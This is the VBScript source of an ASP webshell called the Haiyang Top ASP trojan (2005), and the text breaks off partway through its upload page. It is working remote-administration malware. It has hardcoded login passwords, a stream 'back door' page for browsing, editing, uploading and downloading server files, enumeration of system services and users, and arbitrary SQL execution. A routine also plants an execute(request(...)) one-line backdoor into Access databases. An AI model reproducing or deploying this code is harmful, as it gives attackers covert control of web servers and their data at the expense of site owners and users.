<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<%
	option explicit

	dim url,shellStr,applicationStr,pageName,startTime

	shellStr="Shell"
	applicationStr="Application"

	startTime=timer()
	session.timeout=40
	pageName=request("pageName")
	url=request.serverVariables("url")

	const m="xxxxx"
	const mVersion="2005"
	const userPassword="hididi.net" '登录密码
	const adminPassword="haiyangtop.net" '二次密码
	const clientPassword="#" '客户端密码,如果要插入数据库,则只能设置一位,请只使用数字和字母的组合
	const sqlMaxLoopI=100
	const notdownloadsExists=false
	const myCmdDotExeFile="command.exe" '自己的cmd.exe文件名,如果不方便改源程序,执行时要在路径后面多加上 /c 
	const editableFileExt="$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$bat$lst$aspx$php3$php4$js$css$bat$asa$"
	
	rem +--------------------------------------+
	rem |	    这下面是页面的公共函数部分	   |
	rem +--------------------------------------+
	
	sub echo(str)
		response.write(str)
	end sub
	
	sub onErr(str)
		response.write("出错信息: "&str&"")
		response.end()
	end sub
	
	sub isIn(flag)
		if flag=1 then
			if session(m&"userPassword")<>userPassword then
				echo "<script language=""javascript"">alert('对不起,没有权限的操作,请先登录!');location.href='?pageName=default';</script>"
				response.end
			end if
		 else
		 	isIn(1)
			if session(m&"adminPassword")<>adminPassword then
				echo "<script language=""javascript"">if(confirm('此操作要求二次鉴权\n现在进行这项操作吗?')){location.href='?pageName=login';}else{history.back();}</script>"
				response.end
			end if
		end if
	end sub
	
	function getTheSize(str)
		dim theSize
		theSize=str
		if theSize>=(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024*1024))*10)/10&"G"
		if theSize>=(1024*1024) and theSize<(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024))*10)/10&"M"
		if theSize>=1024 and theSize<(1024*1024) then getTheSize=fix((theSize/1024)*10)/10&"K"
		if theSize>=0 and theSize <1024 then getTheSize=theSize&"B"
	end function
	
	function getStrLen(str)
		dim i
		getStrLen=0
		for i=1 to len(str)
			if asc(mid(str,i,1))>0 and asc(mid(str,i,1))<256 then
				getStrLen=getStrLen+1
			 else
				getStrLen=getStrLen+2
			end if
		next
	end function
	
	function getCutStr(str,n)
		dim i,j
		if n>len(str) then
			n=len(str)
		end if
		for i=1 to n
			if asc(mid(str,i,1))<=0 or asc(mid(str,i,1))>=256 then
				j=j+1
			end if
		next
		getCutStr=left(str,n-j)
	end function
	
	sub redirectTo(url)
		response.redirect(url)
	end sub
	
	sub showTitle(str)
'		response.write("<meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"&vbNewLine)
		response.write("<title>"&str&" - 海阳顶端网ASP木马＠2005官方正式版 - By Marcos & LCX & Allen</title>")
	end sub
	
	sub showExecuteTime()
		response.write("<br><center>"&((timer-startTime)*1000)&" ms</center>")
	end sub
	
	function getParentFolder(thePath)
		dim path
		path=thePath
		if right(path,1)="\" then
			path=left(path,len(path)-1)
		end if

		if instr(path,"\")>0 then
			getParentFolder=left(path,instrRev(path,"\"))
		 else
			getParentFolder=""
		end if
	end function
	
	sub chkErr(err,message)
		if err then
			err.clear
			response.write "<script language=""javascript"">alert('"&message&"');</script>"
			response.end
		end if
	end sub
	
	function encodeForUrl(str,flag)
		if flag=true then
			encodeForUrl=replace(str,"\","\\")
			encodeForUrl=replace(encodeForUrl,"'","\'")
		 else
			encodeForUrl=server.urlEncode(str)
		 	encodeForUrl=replace(encodeForUrl,"%5C","\")
		end if
	end function
	
	function fixNull(str)
		if isNull(str) then
			fixNull=""
		 else
			fixNull=str
		end if
	end function
	
	sub streamUpload(thePath,fileName)
		dim i,j,info,stream,streamT,theFile,overWrite,fileContent
		theFile=request("theFile")
		overWrite=request("overWrite")
		if instr(fileName,":") then
			fileName=fileName
		 else
			fileName=thePath&"\"&fileName
		end if
		server.scriptTimeOut=5000
		set stream=server.createObject("adodb.stream")
		set streamT=server.createObject("adodb.stream")
		
		with stream
			.type=1
			.mode=3
			.open
			.write request.binaryRead(request.totalBytes)
			.position=0
			fileContent=.read()
			i=instrB(fileContent,chrB(13)&chrB(10))
			info=leftB(fileContent,i-1)
			i=len(info)+2
			i=instrB(i,fileContent,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
			j=instrB(i,fileContent,info)-1
			streamT.Type=1
			streamT.Mode=3
			streamT.Open
			stream.position=i
			.copyTo streamT,j-i-2

			on error resume next
			if overWrite="true" then
				streamT.saveToFile fileName,2
			 else
				streamT.saveToFile fileName
			end if

			if err.number=3004 then
				err.clear
				fileName=fileName&"\"&split(theFile,"\")(uBound(split(theFile,"\")))
				if overWrite="true" then
					streamT.saveToFile fileName,2
				 else
					streamT.saveToFile fileName
				end if
			end if
			
			chkErr err,err.description&"\n可能同名文件已经存在.');history.back('"
			echo "<script language=""javascript"">alert('文件上传成功!\n"&replace(fileName,"\","\\")&"');</script>"

			streamT.close
			.close
		end with

		set stream=nothing
		set streamT=nothing
	end sub	

	rem +-------------------------------+
	rem |		下面是页面代码选择		|
	rem +-------------------------------+
	
	if pageName<>"stream" then
		pageOther()
		showMenu()
	end if
	
	select case pageName
		case "","default"
			pageDefault()
		case "server"
			pageServer()
		case "stream"
			pageStream()
		case "sql"
			pageSql()
		case "fso"
			pageFso()
		case "upload"
			pageUpload()
		case "cmdShell"
			pageCmdShell()
		case "login"
			pageLogin()
		case "app"
			pageApp()
	end select

	rem +-------------------------------+
	rem |		下面是各独立功能代码		|
	rem +-------------------------------+

	sub pageDefault()
		dim theAct,password
		theAct=request("theAct")
		password=request("password")
		if theAct="chkLogin" then
			if password=userPassword then
				session(m&"userPassword")=userPassword
				redirectTo(url&"?pageName=server")
			 else
				redirectTo(url&"?pageName=default")
			end if
		end if
		
		showTitle("管理登录")
		echo "<body onload=""formx.password.focus();"">"
%>
<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
<form name="formx" method="post" action="?pageName=default&theAct=chkLogin" onSubmit="return default_canLogin(this);">
  <tr> 
    <td height="25" align="center" class="td">管理登录</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="75" align="center">
		<input name="password" type="password" class="inputLogin" id="password" style="background-color:#ffffff;">
		<input type="submit" name="Submit" value="LOGIN" class="inputLogin">
	</td>
  </tr>
  <tr> 
      <td height="25" align="center" class="td">海阳顶端网ASP木马＠2005版</td>
  </tr>
</form>
</table>
<%
		echo "</body>"
		showExecuteTime()
	end sub

	sub pageLogin()
		dim theAct,password
		isIn(1)
		theAct=request("theAct")
		password=request("password")
		if theAct="chkLogin" then
			if password=adminPassword then
				session(m&"adminPassword")=adminPassword
				redirectTo(url&"?pageName=stream")
			 else
				redirectTo(url&"?pageName=login")
			end if
		end if
				
		showTitle("管理登录")
		echo "<body onload=""formx.password.focus();"">"
%>
<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
<form name="formx" method="post" action="?pageName=login&theAct=chkLogin" onSubmit="return default_canLogin(this);">
  <tr> 
      <td height="25" align="center" class="td">管理密码验证</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="75" align="center">
		<input name="password" type="password" class="inputLogin" id="password" style="background-color:#ffffff;">
		<input type="submit" name="Submit" value="LOGIN" class="inputLogin">
	</td>
  </tr>
  <tr> 
      <td height="25" align="center" class="td">海阳顶端网ASP木马＠2005版</td>
  </tr>
</form>
</table>
<%
		echo "</body>"
		showExecuteTime()
	end sub

	sub pageStream()
		isIn(2)
		dim theAct,thePath,toPath,fileName
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
	
		select case theAct
			case "save"
				streamEditFile(thePath)
				response.end
			case "down"
				downTheFile(thePath)
				response.end
			case "saveAsTwo"
				saveAsTwo thePath,toPath
				response.end
		end select

		showTitle("流操作页面")
		pageOther()
		showMenu()
		
		select case theAct
			case "edit"
				streamEditFile(thePath)
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=stream&thePath="&encodeForUrl(thePath,true)&"';</script>"
				response.end
		end select
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - Adodb.Stream Back Door</td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=stream">
    <tr> 
      <td colspan="2" class="td">&nbsp;PATH: 
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="button" name="Submit3" value="查 看" onclick="location.href='?pageName=stream&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=stream&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="2" class="td">&nbsp;
        <input name="file" type="file" size="25">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td width="30%" class="td" valign="top">
      <%call streamGetFolderList(thePath,true)%>
    </td>
    <td width="555" valign="top"> 
      <%call streamGetFolderList(thePath,false)%>
      <br> <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
      </div></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="2" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub streamEditFile(thePath)
		dim fileName,fileContent,userCharset
		fileName=thePath
		userCharset=request("userCharset")
		
		if request("theAct")="save" then
			fileContent=request("fileContent")
			streamWriteToFile thePath,fileContent
			response.end
		end if
		
		fileContent=streamReadFromFile(fileName,request("userCharset"))
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=stream&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td><input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="50">
        <input type="button" name="Submit6" value="查 看" onclick="location.href='?pageName=stream&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;"></td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(fileContent)%></textarea></td>
    </tr>
    <tr> 
      <td height="50" align="right"><font class="warningColor">非GB2312编码文件可能无法正确保存!</font> 
        <input name="userCharset" type="text" value="<%=userCharset%>" size="10"> 
        <input type="button" value="重新编码" name="Submit3" onclick="location.href='?<%=replace("pageName=stream&thePath="&thePath&"&theAct=edit","\","\\")%>&userCharset='+this.form.userCharset.value;this.disabled=true;"> 
        <input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"> 
        <input type="button" name="Submit2" value="另存为" onclick="stream_saveAs(this.form,'<%=encodeForUrl(thePath,true)%>');"> 
        &nbsp; </td>
    </tr>
  </form>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub streamGetFolderList(thePath,showFolder)
		dim sa,ext,flag,list,folders,theHref
		set sa=server.createObject(shellStr&"."&applicationStr)

		if len(thePath)=2 then
			thePath=thePath&"\"
		end if

		set folders=sa.namespace(thePath)

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(getParentFolder(thePath),false)&""">..</a><br>"
		end if

		on error resume next
		for each list in folders.items
			if showFolder=true and list.isfolder Then
				echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(list.path,false)&""">["
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				echo "]</a><br>"
			 else
				if showFolder=false and (not list.isfolder) Then
					ext=split(list.path,".")(uBound(split(list.path,".")))
					flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
					if instr(lcase(list.path),lcase(server.mapPath("/"))) then
						theHref=mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2)
						echo "&nbsp;<a href=""/"&encodeForUrl(theHref,false)&""" target=_blank>"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")&"</a>"
					 else
						echo "&nbsp;"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")
					end if
					echo "&nbsp;&nbsp;&nbsp;<a href=javascript:; onclick=""stream_downIt('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>Down</font></a>-"
					if flag>0 then
						echo "<a href=#foot onclick=""stream_editIt('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>Edit</font></a>-"
					end if
					echo "<a href=javascript:; onclick=""stream_saveAsTwo('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>SaveAs</font></a>-"
					echo getTheSize(list.size)
					echo "<br>"
				end if
			end if
		next
		if err then
			onErr err.description
		end if
	end sub
	
	sub downTheFile(thePath)
		dim stream,fileName,fileContentType
		fileName=split(thePath,"\")(uBound(split(thePath,"\")))
		set stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		fileContentType=getContentType(fileName)
		response.addHeader "Content-Disposition", "attachment; filename=" & fileName
		response.addHeader "Content-Length",stream.Size
		response.charset="UTF-8"
		response.contentType=fileContentType
		response.binaryWrite stream.read 
		response.flush
		stream.close
		set stream=nothing
	end sub
	
	function getContentType(fileName)
		select case split(fileName,".")(uBound(split(fileName,".")))
			case "asf"
				getContentType="video/x-ms-asf"
			case "avi"
				getContentType="video/avi"
			case "doc"
				getContentType="application/msword"
			case "zip"
				getContentType="application/zip"
			case "xls"
				getContentType="application/vnd.ms-excel"
			case "gif"
				getContentType="image/gif"
			case "jpg", "jpeg"
				getContentType="image/jpeg"
			case "wav"
				getContentType="audio/wav"
			case "mp3"
				getContentType="audio/mpeg3"
			case "mpg", "mpeg"
				getContentType="video/mpeg"
			case "rtf"
				getContentType="application/rtf"
			case "htm", "html"
				getContentType="text/html"
			case "txt","js"
				getContentType="text/plain"
			case else
				getContentType="application/octet-stream"
		end select
	end function
	
	sub saveAsTwo(thePath,toPath)
		on error resume next
		dim stream
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
		set stream=server.createObject("adodb.stream")
		stream.type=1
		stream.open
		stream.loadFromFile thePath
		chkErr err,err.description
		stream.saveToFile toPath,2
		echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		set stream=nothing
	end sub
	
	function streamReadFromFile(thePath,userCharset)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			on error resume next
			.loadFromFile thePath
			chkErr err,"文件无法被打开,请重试!"
			if userCharset<>"" then
				.charset=userCharset
			 else
				.charset="gb2312"
			end if
			chkErr err,"编码类型错误!"
			.Position=2
			streamReadFromFile=.readText()
			.close
		end with
		set stream=nothing
	end function
	
	sub streamWriteToFile(thePath,fileContent)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			.charset="gb2312"
			.writeText fileContent
			.saveToFile thePath,2
			.close
		end with
		set stream=nothing
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
	end sub

	sub pageServer()
		dim i,obj,theAct,theStr
		isIn(1)
		theAct=request("theAct")
		showTitle("服务器相关数据")
		
		dim t1,t2,lsabc,theTime
		
		if theAct="showService" then
			theTime="系统服务列表打开时不执行速度测试"
			theStr="<a href=""?pageName=server"">关闭系统服务列表</a>"
		 else
			t1=timer()
			for i=1 to 500000
				lsabc=1+1
			next
			t2=timer()
			theTime=cstr(int(((t2-t1)*10000)+0.5)/10)&" 毫秒(50万次1+1运算所需时间)"
			theStr="<a href=""?pageName=server&theAct=showService"">打开系统服务列表</a>"
		end if
%>
<table width=560 border=0 align="center" cellpadding=0 cellspacing=0>
  <tr align="center" class="td" onmouseover="this.className='';" onMouseOut="this.className='td'" height=18> 
    <td height="22" colspan="2" class="td">服务器相关数据</td>
  </tr>
  <tr align="center" class="td" onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="0" colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器名</td>
    <td height="22">&nbsp;<%=request.serverVariables("SERVER_NAME")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器IP</td>
    <td height="22">&nbsp;<%=request.serverVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器时间</td>
    <td height="22">&nbsp;<%=now%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;本文件绝对路径</td>
    <td height="22">&nbsp;<%=server.mappath(request.serverVariables("SCRIPT_NAME"))%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器操作系统</td>
    <td height="22">&nbsp;<%=request.serverVariables("OS")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器运算速度测试</td>
    <td height="22" class="warningColor">&nbsp;<%=theTime%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;服务器系统服务列表</td>
    <td height="22">&nbsp;<%=theStr%></td>
  </tr>
<%
	if  theAct="showService" then
		on error resume next
		for each obj in getObject("WinNT://.")
			err.clear
			echo "<tr class=""td"">"
			echo "<td  height=""22"">&nbsp;"
			echo obj.Name
			echo "</td><td class=""td"">&nbsp;"
			echo obj.DisplayName
			if err then
				echo "系统用户(组)"
			end if
			echo "</td></tr>"
			echo "<tr class=""td""><td height=""22""></td><td>&nbsp;<font color=#FF0000>"&obj.path&"</font></td></tr>"
		next 
	end if
%>
  <tr class="td" onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td colspan="2" align=left class="trHead">&nbsp;</td>
  </tr>
  <tr align="right" class="td" height=18> 
    <td height="22" colspan="2">Powered By Allen &amp; LCX 2004.11&nbsp;</td>
  </tr>
</table>
<%
		showExecuteTime()
	end sub

	sub pageSql()
		isIn(2)
		dim theAct,sqlStr
		theAct=request("theAct")
		sqlStr=request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		if sqlStr="" then
			if session(m&"sqlStr")="" then
				sqlStr="e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 else
				sqlStr=session(m&"sqlStr")
			end if
		end if
		session(m&"sqlStr")=sqlStr
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=sql&theAct=showTables" onsubmit="this.Submit.disabled=true;">
  <tr> 
      <td height="22" align="center" class="td"><a href="?pageName=sql">mdb+mssql数据库操作</a></td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
      <td height="50" align="center" class="td"> 
        <input name="sqlStr" type="text" id="sqlStr" value="<%=sqlStr%>" size="60">
    </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
		<input type="submit" name="Submit" value="提 交">
		<input type="button" name="Submit2" value="插 入" onclick="if(confirm('这里是在ACESS数据里插入海阳顶端网ASP后门\n默认密码是<%=clientPassword%>\n后门插入后可以使用的前提是\n数据库是asp后缀,并且没有错乱asp代码\n确认操作吗?')){location.href='?pageName=sql&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}">
		<input type="button" name="Submit3" value="提 示" onClick="alert('插入只针对ACESS操作,\n要浏览ACESS在表单中的写法是,d:bbs.mdb\nSQL据库写法是,sql:连接字符串,不要忘写sql:')">
        <input name="button" type="button" onclick="this.form.sqlStr.value='e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';" value="示 例"> 
      </td>
  </tr>
</form>
</table>
<%
		select case theAct
			case "showTables"
				showTables()
			case "query"
				showQuery()
			case "inject"
				accessInject()
		end select
	
		showExecuteTime()
	end sub
	
	sub showTables()
		dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set conn=server.createObject("adodb.connection")
		
		on error resume next
		conn.open connStr
		chkErr err,encodeForUrl(err.description&"\n"&sqlStr,true)
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&enCodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
		rsTable.moveFirst
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">数据库表结构查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td valign="top" class="td"><%=tablesStr%><br> <br> </td>
    <td align="center" valign="top"><a href="<%="?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&""%>">转到SQL命令执行</a> 
      <%
		do until rsTable.eof
			set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
%>
      <br> 
      <table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="22" colspan="6" class="tr"><b><%=rsTable("Table_Name")%></b></td>
        </tr>
        <tr align="center"> 
          <td class="td">字段名</td>
          <td class="td">类型</td>
          <td class="td">大小</td>
          <td class="td">精度</td>
          <td class="td">允许为空</td>
          <td class="td">默认值</td>
        </tr>
        <%
			loopI=0
			do until rsColumn.eof
				loopI=loopI+1
				if loopI>sqlMaxLoopI then
					exit do
				end if
		%>
        <tr align="center" onmouseout="this.className='';" onmouseover="this.className='td';"> 
          <td align="left">&nbsp;<%=rsColumn("Column_Name")%></td>
          <td width="80"><%=getDataType(rsColumn("Data_Type"))%></td>
          <td width="70"><%=rsColumn("Character_Maximum_Length")%></td>

          <td width="70"><%=rsColumn("Numeric_Precision")%></td>
          <td width="70"><%=rsColumn("Is_Nullable")%></td>
          <td width="80"><%=rsColumn("Column_Default")%></td>
        </tr>
        <%
				rsColumn.moveNext
			loop
		%>
      </table>
      <%
			rsTable.moveNext
		loop
%>
    </td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
  </tr>
</table>
<%
		conn.close
		set conn=nothing
		set rsTable=nothing
		set rsColumn=nothing
	end sub
	
	sub showQuery()
		dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
		sql=request("sql")
		page=request("page")
		sqlStr=request("sqlStr")
		theTable=request("theTable")
		
		if not isNumeric(page) or page="" then
			page=1
		end if
		
		if sql="" and theTable<>"" then
			sql="select top 10 * from ["&theTable&"]"
		end if
		
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")
	
		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&encodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>&sql=<%=enCodeForUrl(sql,false)%>">SQL命令执行及查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" action="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>">
    <tr> 
      <td width="150" valign="top" class="td"><%=tablesStr%><br> <br> </td>
      <td align="center" valign="top"><br> 
        <input name="sql" type="text" id="sql" value="<%=server.htmlEncode(sql)%>" size="60"> 
        <input type="submit" name="Submit4" value="执行查询"> <br> 
        <%
		if sql<>"" and left(lcase(sql),7)="select " then
			rs.open sql,conn,1,1
			chkErr err,encodeForUrl("错误信息: "&err.description,false)
			rs.pageSize=20
			if not rs.eof then
				rs.absolutePage=page
			end if
			if rs.fields.count>0 then
				echo "<br><table border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan="""&rs.fields.count&""">SQL操作 - 执行结果</td>"
				echo "</tr>"
				echo "<tr>"
				for j=0 to rs.fields.count-1
					echo "<td height=""22"" align=""center"" class=""td""> "&rs.fields(j).name&" </td>"
				next
				for i=1 to 20
					if rs.eof then
						exit for
					end if
					echo "</tr>"
					echo "<tr onmouseover=""javascript:this.className='td';"" onmouseout=""javascript:this.className='';"" valign=top>"
					for j=0 to rs.fields.count-1
						echo "<td height=""22"" align=""center"">"&server.htmlEncode(fixNull(rs(j)))&"</td>"
					next
					echo "</tr>"
					rs.movenext
				next
			end if
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan="""&rs.fields.count&""">"
			for i=1 to rs.pagecount
				echo replace("<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&sql="&sql&"&page="&i&"""><font {$font"&i&"}>"&i&"</font></a> ","{$font"&page&"}","class=warningColor")
			next
			echo "</td></tr></table><br>"
			rs.close
		 else
		 	if sql<>"" then
				on error resume next
				conn.execute(sql)
				chkErr err,encodeForUrl(err.description&sql,false)
				echo "<center><br>执行完毕!</center>"
			end if
		end if
%>
      </td>
    </tr>
    <tr align="right"> 
      <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
    </tr>
  </form>
</table>
<br>
<%		
		conn.close
		set rs=nothing
		set conn=nothing
		set rsTable=nothing
	end sub
	
	function getDataType(typeId)
		select case typeId
			case 130
				getDataType="文本"
			case 2
				getDataType="整型"
			case 3
				getDataType="长整型"
			case 7
				getDataType="日期/时间"
			case 5
				getDataType="双精度型"
			case 11
				getDataType="是/否"
			case 128
				getDataType="OLE 对象"
			case else
				getDataType=typeId
		end select
	end function
	
	sub accessInject()
		dim rs,conn,sqlStr,connStr
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			onErr("插入只对ACCESS数据库有效!")
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")

		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr

		if notdownloadsExists=true then
			conn.execute("drop table notdownloads")
		end if

		conn.execute("create table notdownloads(notdownloads oleobject)")

		rs.open "notdownloads",conn,1,3
		rs.addnew
		rs("notdownloads").appendchunk(chrB(asc("<"))&chrB(asc("%"))&chrB(asc("e"))&chrB(asc("x"))&chrB(asc("e"))&chrB(asc("c"))&chrB(asc("u"))&chrB(asc("t"))&chrB(asc("e"))&chrB(asc("("))&chrB(asc("r"))&chrB(asc("e"))&chrB(asc("q"))&chrB(asc("u"))&chrB(asc("e"))&chrB(asc("s"))&chrB(asc("t"))&chrB(asc("("))&chrB(asc(""""))&chrB(asc(clientPassword))&chrB(asc(""""))&chrB(asc(")"))&chrB(asc(")"))&chrB(asc("%"))&chrB(asc(">"))&chrB(asc(" ")))
	    rs.update
    	rs.close
		
		echo "<script language=""javascript"">alert('插入成功!');history.back();</script>"
		
		conn.close
		set rs=nothing
		set conn=nothing
	end sub

	sub pageUpload()
		isIn(2)
		dim theAct,thePath,fileName
		theAct=request("theAct")
		thePath=request("thePath")
		fileName=request("fileName")
		
		showTitle("其它操作页面")
